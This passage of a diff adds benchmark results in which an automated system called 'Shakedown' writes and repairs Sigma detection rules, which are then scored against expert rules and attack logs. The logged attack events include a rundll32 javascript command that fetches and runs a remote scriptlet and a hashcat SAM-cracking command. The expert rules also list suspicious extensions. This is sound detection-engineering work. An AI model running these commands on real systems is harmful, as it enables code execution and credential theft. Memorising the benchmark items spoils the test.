\"falsepositives\": [\n  \"Legitimate bitsadmin transfers of approved files with safe extensions.\"\n ],\n \"level\": \"high\"\n}",
+     "sha256": "77489260f1da02684d6876751b8b113da4261cccd86dc2e3b16e8cccb3832f14",
+     "validation": {
+      "ok": false,
+      "errors": [
+       "rule could not be built: group name 'condition' is duplicated or reserved"
+      ],
+      "sigma_output": ""
+     },
+     "evaluation": null,
+     "tokens": 10410,
+     "latency_s": 42.83,
+     "evaluator_error": null,
+     "resamples": 1
+    }
+   ],
+   "oneshot_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "best_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 1,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 9.62
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: File With Suspicious Extension Downloaded Via Bitsadmin\nid: 5b80a791-ad9b-4b75-bcc1-ad4e1e89c200\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file with a suspicious extension\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-28\nmodified: 2023-05-30\ntags:\n    - attack.persistence\n    - attack.execution\n    - attack.stealth\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_flags:\n        CommandLine|contains:\n            - ' /transfer '\n            - ' /create '\n            - ' /addfile '\n    selection_extension:\n        CommandLine|contains:\n            - '.7z'\n            - '.asax'\n            - '.ashx'\n            - '.asmx'\n            - '.asp'\n            - '.aspx'\n            - '.bat'\n            - '.cfm'\n            - '.cgi'\n            - '.chm'\n            - '.cmd'\n            - '.dll'\n            - '.gif'\n            - '.jpeg'\n            - '.jpg'\n            - '.jsp'\n            - '.jspx'\n            - '.log'\n            - '.png'\n            - '.ps1'\n            - '.psm1'\n            - '.rar'\n            - '.scf'\n            - '.sct'\n            - '.txt'\n            - '.vbe'\n            - '.vbs'\n            - '.war'\n            - '.wsf'\n            - '.wsh'\n            - '.xll'\n            - '.zip'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\nregression_tests_path: regression_data/rules/windows/process_creation/proc_creation_win_bitsadmin_download_susp_extensions/info.yml\nsimulation:\n    - type: atomic-red-team\n      name: Windows - BITSAdmin BITS Download\n      technique: T1105\n      atomic_guid: a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b\n"
+  },
+  {
+   "task": {
+    "rule_id": "5b768e71-86f2-4879-b448-81061cbae951",
+    "rule_path": "rules/windows/process_creation/proc_creation_win_net_user_default_accounts_manipulation.yml",
+    "title": "Suspicious Manipulation Of Default Accounts Via Net.EXE",
+    "category": "process_creation",
+    "date": "2022-09-01",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/process_creation/proc_creation_win_net_user_default_accounts_manipulation/5b768e71-86f2-4879-b448-81061cbae951.evtx",
+    "sample_sha256": "0e862a09633c9a07eca52fb3c9d164e5b41d072ad7b53865c570e8cc6cc1a753"
+   },
+   "spec": {
+    "behavior": "successful",
+    "logsource_category": "process_creation",
+    "observables": [
+     {
+      "field": "CommandLine",
+      "match": "contains",
+      "value": "administrator",
+      "quote": "such as 'administrator' and 'guest'."
+     },
+     {
+      "field": "CommandLine",
+      "match": "contains",
+      "value": "guest",
+      "quote": "such as 'administrator' and 'guest'."
+     }
+    ],
+    "techniques": [
+     {
+      "id": "T1560.001",
+      "quote": "ATT&CK tags: attack.collection, attack.t1560.001"
+     }
+    ]
+   },
+   "spec_dropped": [
+    {
+     "kind": "observable",
+     "item": {
+      "field": "Image",
+      "match": "endswith",
+      "value": "\\net.exe",
+      "quote": "Suspicious Manipulation Of Default Accounts Via Net.EXE"
+     },
+     "reason": "value not contained in its quote"
+    }
+   ],
+   "success": true,
+   "stop_reason": "acceptance criteria passed",
+   "best_index": 0,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "title: Suspicious Manipulation Of Default Accounts Via Net.exe\nid: b049a9a3-3422-459d-a4bb-b72ba5981858\nstatus: experimental\ndescription: Detects suspicious manipulations of default accounts such as 'administrator' and 'guest' using net.exe.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.t1560.001\n- attack.collection\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith: \\net.exe\n  selection_cmd:\n    CommandLine|contains:\n    - administrator\n    - guest\n  condition: selection_img and selection_cmd\nfalsepositives:\n- Unknown\nlevel: high\n",
+     "sha256": "8b854369149e9f2d7394774183b7a59f670d220c9ff4f2ed134b8e600d32e6cc",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 1,
+      "attack_missed": [],
+      "attack_events_hit": 1,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [],
+      "seconds": 8.98
+     },
+     "tokens": 1451,
+     "latency_s": 5.62,
+     "evaluator_error": null,
+     "resamples": 0
+    }
+   ],
+   "oneshot_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "best_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 1,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 16.62
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: Suspicious Manipulation Of Default Accounts Via Net.EXE\nid: 5b768e71-86f2-4879-b448-81061cbae951\nstatus: test\ndescription: Detects suspicious manipulations of default accounts such as 'administrator' and 'guest'. For example 'enable' or 'disable' accounts or change the password...etc\nreferences:\n    - https://www.trellix.com/en-sg/about/newsroom/stories/threat-labs/lockergoga-ransomware-family-used-in-targeted-attacks.html\n    - https://redacted.com/blog/bianlian-ransomware-gang-gives-it-a-go/\n    - https://www.microsoft.com/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-01\nmodified: 2023-02-21\ntags:\n    - attack.collection\n    - attack.t1560.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\net.exe'\n              - '\\net1.exe'\n        - OriginalFileName:\n              - 'net.exe'\n              - 'net1.exe'\n    selection_user_option:\n        CommandLine|contains: ' user '\n    selection_username:\n        CommandLine|contains:\n            # Note: We need to write the full account name for cases starting with 'admin' to avoid lookups only with the user flag\n            - ' J\u00e4rjestelm\u00e4nvalvoja ' # Finish\n            - ' Rendszergazda ' # Hungarian\n            - ' \u0410\u0434\u043c\u0438\u043d\u0438\u0441\u0442\u0440\u0430\u0442\u043e\u0440 ' # Russian\n            - ' Administrateur ' # French\n            - ' Administrador ' # Portuguese (Brazil + Portugal) + Spanish\n            - ' Administrat\u00f6r ' # Swedish\n            - ' Administrator ' # English\n            - ' guest '\n            - ' DefaultAccount '\n            # The cases below are for when an attacker requests the net command via 'cmd /c....'\n            # First in double quotes\n            - ' \"J\u00e4rjestelm\u00e4nvalvoja\" ' # Finish\n            - ' \"Rendszergazda\" ' # Hungarian\n            - ' \"\u0410\u0434\u043c\u0438\u043d\u0438\u0441\u0442\u0440\u0430\u0442\u043e\u0440\" ' # Russian\n            - ' \"Administrateur\" ' # French\n            - ' \"Administrador\" ' # Portuguese (Brazil + Portugal) + Spanish\n            - ' \"Administrat\u00f6r\" ' # Swedish\n            - ' \"Administrator\" ' # English\n            - ' \"guest\" '\n            - ' \"DefaultAccount\" '\n            # Second in single quotes\n            - \" 'J\u00e4rjestelm\u00e4nvalvoja' \" # Finish\n            - \" 'Rendszergazda' \" # Hungarian\n            - \" '\u0410\u0434\u043c\u0438\u043d\u0438\u0441\u0442\u0440\u0430\u0442\u043e\u0440' \" # Russian\n            - \" 'Administrateur' \" # French\n            - \" 'Administrador' \" # Portuguese (Brazil + Portugal) + Spanish\n            - \" 'Administrat\u00f6r' \" # Swedish\n            - \" 'Administrator' \" # English\n            - \" 'guest' \"\n            - \" 'DefaultAccount' \"\n    filter:\n        CommandLine|contains|all:\n            - 'guest'\n            - '/active no'\n    condition: all of selection_* and not filter\nfalsepositives:\n    - Some false positives could occur with the admin or guest account. It depends on the scripts being used by the admins in your env. If you experience a lot of FP you could reduce the level to medium\nlevel: high\nregression_tests_path: regression_data/rules/windows/process_creation/proc_creation_win_net_user_default_accounts_manipulation/info.yml\n"
+  },
+  {
+   "task": {
+    "rule_id": "c3a99af4-35a9-4668-879e-c09aeb4f2bdf",
+    "rule_path": "rules/windows/process_creation/proc_creation_win_rundll32_uncommon_dll_extension.yml",
+    "title": "Rundll32 Execution With Uncommon DLL Extension",
+    "category": "process_creation",
+    "date": "2022-01-13",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/process_creation/proc_creation_win_rundll32_uncommon_dll_extension/c3a99af4-35a9-4668-879e-c09aeb4f2bdf.evtx",
+    "sample_sha256": "25d77c09eaac64a09e9b0e3f93a2f897b9f0a5296c269c0c7a3203798b5227b2"
+   },
+   "spec": {
+    "behavior": "none",
+    "logsource_category": "process_creation",
+    "observables": [],
+    "techniques": [
+     {
+      "id": "T1218.011",
+      "quote": "ATT&CK tags: attack.stealth, attack.t1218.011"
+     }
+    ]
+   },
+   "spec_dropped": [
+    {
+     "kind": "observable",
+     "item": {
+      "field": "Image",
+      "match": "endswith",
+      "value": "\\\\rundll32.exe",
+      "quote": "Detects the execution of rundll32 with a command line that doesn't contain a common extension"
+     },
+     "reason": "value not contained in its quote"
+    },
+    {
+     "kind": "observable",
+     "item": {
+      "field": "CommandLine",
+      "match": "contains",
+      "value": ".dll",
+      "quote": "Detects the execution of rundll32 with a command line that doesn't contain a common extension"
+     },
+     "reason": "value not contained in its quote"
+    },
+    {
+     "kind": "technique",
+     "item": {
+      "id": "TA0005",
+      "quote": "ATT&CK tags: attack.stealth, attack.t1218.011"
+     },
+     "reason": "value not contained in its quote"
+    }
+   ],
+   "success": false,
+   "stop_reason": "repair budget exhausted",
+   "best_index": 2,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "title: Rundll32 Execution with Uncommon DLL Extension\nid: 5ddeea1c-192b-4ff3-a090-7a35575f288f\nstatus: experimental\ndescription: 'Detects rundll32.exe being used to load a file with an uncommon extension, which may indicate abuse of T1218.011\n  (Signed Binary Proxy Execution: Rundll32).'\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.stealth\n- attack.t1218.011\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_rundll32:\n    Image|endswith: \\\\rundll32.exe\n  filter_common_ext:\n    CommandLine|contains:\n    - .dll\n    - .exe\n    - .sys\n    - .ocx\n    - .cpl\n    - .drv\n  condition: selection_rundll32 and not filter_common_ext\nfalsepositives:\n- Legitimate use of rundll32 with uncommon extensions is rare but possible.\nlevel: high\n",
+     "sha256": "d9775a3857bfe5be680976417e64e5a69ccdea193f6b078c453e0427dee0e6ae",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "c3a99af4-35a9-4668-879e-c09aeb4f2bdf.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 1,
+        "hits": 1,
+        "examples": [
+         {
+          "file": "Security.evtx",
+          "event": "SubjectUserSid: S-1-5-21-712794737-353456615-3249761964-1001  SubjectUserName: evtx  SubjectDomainName: evtx-PC  SubjectLogonId: 0x16812  NewProcessId: 0x978  NewProcessName: C:\\Windows\\System32\\rundll32.exe  TokenElevationType: %%1938  ProcessId: 0x4d4  Provider_Name: Microsoft-Windows-Security-Auditing  Provider_Guid: 54849625-5478-4994-A5BA-3E3B0328C30D  EventID: 4688  Version: 0  Level: 0  Task: 13312  Opcode: 0  Keywords: 0x8020000000000000  TimeCreated_SystemTime: 2022-04-04T12:16:57.402064085Z  EventRecordID: 504  Execution_ProcessID: 4  Execution_ThreadID: 48  Channel: Security  Comput",
+          "matched": [
+           {
+            "SearchIdentifier": "selection_rundll32",
+            "Field": "NewProcessName",
+            "Offset": 19,
+            "Data": "\\rundll32.exe"
+           }
+          ]
+         }
+        ]
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 1,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "technique_id=T1218.011,technique_name=rundll32.exe",
+        "UtcTime": "2026-08-30 15:07:39.470",
+        "ProcessGuid": "{570e49aa-473b-6a94-8e10-000000001800}",
+        "ProcessId": "2580",
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "FileVersion": "10.0.26100.8972 (WinBuild.160101.0800)",
+        "Description": "Windows host process (Rundll32)",
+        "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+        "Company": "Microsoft Corporation",
+        "OriginalFileName": "RUNDLL32.EXE",
+        "CommandLine": "rundll32.exe  javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();window.close();",
+        "CurrentDirectory": "C:\\Users\\frack113\\AppData\\Local\\Temp\\",
+        "User": "SigmaCatchVm\\frack113",
+        "LogonGuid": "{570e49aa-0307-6a94-5d82-100000000000}",
+        "LogonId": "0x000000000010825d",
+        "TerminalSessionId": "1",
+        "IntegrityLevel": "High",
+        "Hashes": "SHA1=A9AC2CB1F8CFC2E9692B1C5019D48E1D522BAE49,MD5=807D8C1EA3658035B6F5B27232ED120D,SHA256=C4C8160C42407741BAF0946A1FC0E8162E14C6CC543E754EFD78CC52BB316AF5,IMPHASH=C8B70D465C35D895C4171BAF042BB63A",
+        "ParentProcessGuid": "{570e49aa-473b-6a94-8c10-000000001800}",
+        "ParentProcessId": "5652",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "ParentCommandLine": "\"cmd.exe\" /c rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();window.close();",
+        "ParentUser": "SigmaCatchVm\\frack113"
+       }
+      ],
+      "seconds": 17.81
+     },
+     "tokens": 3488,
+     "latency_s": 14.92,
+     "evaluator_error": null,
+     "resamples": 1
+    },
+    {
+     "index": 1,
+     "action": "repair",
+     "rule_text": "{\n \"title\": \"Rundll32 Execution with Uncommon DLL Extension\",\n \"description\": \"Detects rundll32.exe being used to load a file with an uncommon extension, which may indicate abuse of T1218.011\\n  (Signed Binary Proxy Execution: Rundll32).\",\n \"tags\": [\n  \"attack.stealth\",\n  \"attack.t1218.011\"\n ],\n \"logsource_category\": \"process_creation\",\n \"groups\": [],\n \"condition\": \"\",\n \"falsepositives\": [\n  \"Legitimate use of rundll32 with uncommon extensions is rare but possible.\"\n ],\n \"level\": \"high\"\n}",
+     "sha256": "ba35153c5143f0920278833a717883268785dc68520dfd4c7b70eb61f8bc4d52",
+     "validation": {
+      "ok": false,
+      "errors": [
+       "rule could not be built: rule has no condition"
+      ],
+      "sigma_output": ""
+     },
+     "evaluation": null,
+     "tokens": 17330,
+     "latency_s": 57.77,
+     "evaluator_error": null,
+     "resamples": 3
+    },
+    {
+     "index": 2,
+     "action": "repair",
+     "rule_text": "title: Rundll32 Execution with Uncommon DLL Extension\nid: 5ddeea1c-192b-4ff3-a090-7a35575f288f\nstatus: experimental\ndescription: \"Detects rundll32.exe being used to load a file with an uncommon extension, which may indicate abuse of T1218.011\\n\\\n  \\  (Signed Binary Proxy Execution: Rundll32).\"\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.stealth\n- attack.t1218.011\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: \\\\rundll32.exe\n    CommandLine|contains:\n    - .ocx\n    - .cpl\n    - .dll\n  filter:\n    CommandLine|contains:\n    - \\\\system32\\\\\n    - \\\\syswow64\\\\\n  condition: selection and not filter\nfalsepositives:\n- Legitimate use of rundll32 with uncommon extensions is rare but possible.\nlevel: high\n",
+     "sha256": "2a94544025ef15a0ea002a54690045d739182a06a5dec218db9bdad68d7587db",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "c3a99af4-35a9-4668-879e-c09aeb4f2bdf.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 1,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "technique_id=T1218.011,technique_name=rundll32.exe",
+        "UtcTime": "2026-08-30 15:07:39.470",
+        "ProcessGuid": "{570e49aa-473b-6a94-8e10-000000001800}",
+        "ProcessId": "2580",
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "FileVersion": "10.0.26100.8972 (WinBuild.160101.0800)",
+        "Description": "Windows host process (Rundll32)",
+        "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+        "Company": "Microsoft Corporation",
+        "OriginalFileName": "RUNDLL32.EXE",
+        "CommandLine": "rundll32.exe  javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();window.close();",
+        "CurrentDirectory": "C:\\Users\\frack113\\AppData\\Local\\Temp\\",
+        "User": "SigmaCatchVm\\frack113",
+        "LogonGuid": "{570e49aa-0307-6a94-5d82-100000000000}",
+        "LogonId": "0x000000000010825d",
+        "TerminalSessionId": "1",
+        "IntegrityLevel": "High",
+        "Hashes": "SHA1=A9AC2CB1F8CFC2E9692B1C5019D48E1D522BAE49,MD5=807D8C1EA3658035B6F5B27232ED120D,SHA256=C4C8160C42407741BAF0946A1FC0E8162E14C6CC543E754EFD78CC52BB316AF5,IMPHASH=C8B70D465C35D895C4171BAF042BB63A",
+        "ParentProcessGuid": "{570e49aa-473b-6a94-8c10-000000001800}",
+        "ParentProcessId": "5652",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "ParentCommandLine": "\"cmd.exe\" /c rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();window.close();",
+        "ParentUser": "SigmaCatchVm\\frack113"
+       }
+      ],
+      "seconds": 7.97
+     },
+     "tokens": 2305,
+     "latency_s": 9.45,
+     "evaluator_error": null,
+     "resamples": 1
+    },
+    {
+     "index": 3,
+     "action": "repair",
+     "rule_text": "{\n \"title\": \"Rundll32 Execution with Uncommon DLL Extension\",\n \"description\": \"Detects rundll32.exe being used to load a file with an uncommon extension, which may indicate abuse of T1218.011\\n  (Signed Binary Proxy Execution: Rundll32).\",\n \"tags\": [\n  \"attack.stealth\",\n  \"attack.t1218.011\"\n ],\n \"logsource_category\": \"process_creation\",\n \"groups\": [],\n \"condition\": \"\",\n \"falsepositives\": [\n  \"Legitimate use of rundll32 with uncommon extensions is rare but possible.\"\n ],\n \"level\": \"high\"\n}",
+     "sha256": "ba35153c5143f0920278833a717883268785dc68520dfd4c7b70eb61f8bc4d52",
+     "validation": {
+      "ok": false,
+      "errors": [
+       "rule could not be built: rule has no condition"
+      ],
+      "sigma_output": ""
+     },
+     "evaluation": null,
+     "tokens": 11065,
+     "latency_s": 29.03,
+     "evaluator_error": null,
+     "resamples": 3
+    }
+   ],
+   "oneshot_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "best_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 1,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 8.02
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: Rundll32 Execution With Uncommon DLL Extension\nid: c3a99af4-35a9-4668-879e-c09aeb4f2bdf\nstatus: test\ndescription: Detects the execution of rundll32 with a command line that doesn't contain a common extension\nreferences:\n    - https://twitter.com/mrd0x/status/1481630810495139841?s=12\nauthor: Tim Shelton, Florian Roth (Nextron Systems), Yassine Oukessou\ndate: 2022-01-13\nmodified: 2026-10-13\ntags:\n    - attack.stealth\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    filter_main_null:\n        CommandLine: null\n    filter_main_empty:\n        CommandLine: ''\n    filter_main_known_extension:\n        - CommandLine|contains:\n              # Note: This aims to cover: single and double quotes in addition to spaces and comma \",\" usage.\n              - '.cpl '\n              - '.cpl,'\n              - '.cpl\"'\n              - \".cpl'\"\n              - '.dll '\n              - '.dll,'\n              - '.dll\"'\n              - \".dll'\"\n              - '.inf '\n              - '.inf,'\n              - '.inf\"'\n              - \".inf'\"\n        - CommandLine|endswith:\n              # Note: This aims to cover: single and double quotes in addition to spaces and comma \",\" usage.\n              - '.cpl'\n              - '.dll'\n              - '.inf'\n    filter_main_localserver:\n        CommandLine|contains: ' -localserver '\n    filter_main_zzzzInvokeManagedCustomActionOutOfProc:\n        ParentImage|endswith: '\\msiexec.exe'\n        CommandLine|contains|all:\n            - ':\\Windows\\Installer\\'\n            - '.tmp'\n            - 'zzzzInvokeManagedCustomActionOutOfProc'\n    filter_main_streamci:\n        # Windows streaming-device class installer, run by svchost (DeviceInstall) during driver setup\n        # e.g. rundll32.exe streamci,StreamingDeviceSetup {eeab7790-c514-11d1-b42b-00805fc1270e},asyncmac,{...}\n        Image: 'C:\\Windows\\System32\\rundll32.exe'\n        ParentImage: 'C:\\Windows\\System32\\svchost.exe'\n        CommandLine|contains: ' streamci,StreamingDeviceSetup {'\n    filter_optional_EdgeUpdate:\n        ParentCommandLine|contains|all:\n            - ':\\Users\\'\n            - '\\AppData\\Local\\Microsoft\\EdgeUpdate\\Install\\{'\n            - '\\EDGEMITMP_'\n            - '.tmp\\setup.exe'\n            - '--install-archive='\n            - '--previous-version='\n            - '--msedgewebview --verbose-logging --do-not-launch-msedge --user-level'\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: medium\nregression_tests_path: regression_data/rules/windows/process_creation/proc_creation_win_rundll32_uncommon_dll_extension/info.yml\n"
+  },
+  {
+   "task": {
+    "rule_id": "39b31e81-5f5f-4898-9c0e-2160cfc0f9bf",
+    "rule_path": "rules/windows/process_creation/proc_creation_win_hktl_hashcat.yml",
+    "title": "HackTool - Hashcat Password Cracker Execution",
+    "category": "process_creation",
+    "date": "2021-12-27",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/process_creation/proc_creation_win_hktl_hashcat/39b31e81-5f5f-4898-9c0e-2160cfc0f9bf.evtx",
+    "sample_sha256": "88fd399fb90ed6f0c10e788e63b6e8c2b5ca6bb049cd86ea182c2f519f8ceaf4"
+   },
+   "spec": {
+    "behavior": "",
+    "logsource_category": "process_creation",
+    "observables": [
+     {
+      "field": "Image",
+      "match": "equals",
+      "value": "Hashcat.exe",
+      "quote": "Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against"
+     },
+     {
+      "field": "CommandLine",
+      "match": "contains",
+      "value": "SAM file",
+      "quote": "Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against"
+     },
+     {
+      "field": "CommandLine",
+      "match": "contains",
+      "value": "Password list",
+      "quote": "Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against"
+     }
+    ],
+    "techniques": [
+     {
+      "id": "T1110.002",
+      "quote": "- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1110.002/T1110.002.md#atomic-test-1---password-cracking-with-hashcat"
+     }
+    ]
+   },
+   "spec_dropped": [],
+   "success": false,
+   "stop_reason": "repair budget exhausted",
+   "best_index": 0,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "title: Potential Hashcat Password Cracking Activity\nid: 0a69dd5f-5e33-4a32-870f-ef00e7a07c08\nstatus: experimental\ndescription: Detects execution of Hashcat.exe with command line arguments referencing a SAM file and a password list, indicative\n  of credential access via password cracking.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.credential-access\n- attack.t1110.002\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith: \\\\Hashcat.exe\n  selection_sam:\n    CommandLine|contains: SAM file\n  selection_pass:\n    CommandLine|contains: Password list\n  condition: selection_img and selection_sam and selection_pass\nfalsepositives:\n- Legitimate administrative use of Hashcat for password recovery in authorized penetration testing should be considered.\nlevel: high\n",
+     "sha256": "abed5e43e400d912828d95af01b07e4543759f0c2b969fea8e516a81a315ce6c",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "39b31e81-5f5f-4898-9c0e-2160cfc0f9bf.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 1,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "technique_id=T1083,technique_name=File and Directory Discovery",
+        "UtcTime": "2026-08-09 08:34:31.379",
+        "ProcessGuid": "{570e49aa-3b97-6a78-0a0c-000000001400}",
+        "ProcessId": "8700",
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "FileVersion": "10.0.26100.8737 (WinBuild.160101.0800)",
+        "Description": "Windows Command Processor",
+        "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+        "Company": "Microsoft Corporation",
+        "OriginalFileName": "Cmd.Exe",
+        "CommandLine": "\"cmd.exe\" /c cd C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\hashcat6\\hashcat-6.1.1\\hashcat.exe\\.. & C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\hashcat6\\hashcat-6.1.1\\hashcat.exe -a 0 -m 1000 -r .\\rules\\Incisive-leetspeak.rule C:\\AtomicRedTeam\\atomics\\T1110.002\\src\\sam.txt C:\\AtomicRedTeam\\atomics...",
+        "CurrentDirectory": "C:\\Users\\frack113\\AppData\\Local\\Temp\\",
+        "User": "SigmaCatchVm\\frack113",
+        "LogonGuid": "{570e49aa-c366-6a76-1edd-080000000000}",
+        "LogonId": "0x000000000008dd1e",
+        "TerminalSessionId": "1",
+        "IntegrityLevel": "High",
+        "Hashes": "SHA1=6142A8457F497ABC4B102D75F549F76A9E3577C7,MD5=1F4D18374A699452622E80F6D5BB743E,SHA256=65EC268ADD3973B6DCA64222985DA47CAEAEE44A340B0EC1466782914FD743D9,IMPHASH=010B165E4C37F484601D3DBD700C9423",
+        "ParentProcessGuid": "{570e49aa-3103-6a78-c408-000000001400}",
+        "ParentProcessId": "4276",
+        "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
